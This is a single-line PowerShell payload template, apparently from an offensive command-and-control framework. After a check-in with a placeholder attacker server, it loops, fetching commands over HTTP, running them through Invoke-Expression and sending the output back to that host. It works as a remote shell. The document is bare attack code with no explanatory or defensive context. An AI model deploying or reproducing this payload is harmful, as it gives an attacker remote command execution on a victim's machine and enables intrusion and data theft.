$s='*SERVERIP*';$i='*SESSIONID*';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/*VERIFY* -Headers @{"X-hoax-id"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/*GETCMD* -Headers @{"X-hoax-id"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/*POSTRES* -Method POST -Headers @{"X-hoax-id"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($r+$e) -join ' ')} sleep *FREQ*}
